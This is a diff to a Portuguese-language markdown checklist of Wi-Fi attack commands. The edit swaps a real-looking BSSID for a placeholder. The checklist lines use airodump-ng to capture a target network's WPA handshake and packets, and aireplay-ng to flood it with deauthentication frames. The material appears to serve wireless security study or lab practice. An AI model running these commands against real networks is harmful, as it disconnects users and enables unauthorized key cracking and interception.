@@ -26,7 +26,7 @@
     - comando serve para iniciar a captura de pacotes Wi-Fi com a interface em modo monitor
 - [ ] **sudo airodump-ng wlan0mon -c 1 --bssid xx:xx:xx:xx:xx:xx**
     - comando serve focar em uma rede específica e capturar o Handshake WPA (se alguém se conectar), pacotes de dados e informações dos dispositivos conectados
-- [ ] **sudo airodump-ng -w arquivocaptura -c 1 --bssid AA:83:89:E8:B6:CA wlan0mon** (permanecer em execução)
+- [ ] **sudo airodump-ng -w arquivocaptura -c 1 --bssid xx:xx:xx:xx:xx:xx wlan0mon** (permanecer em execução)
     - Esse comando foca exclusivamente na rede Wi-Fi alvo e salva os pacotes capturados
 
 - [ ] **sudo aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon**
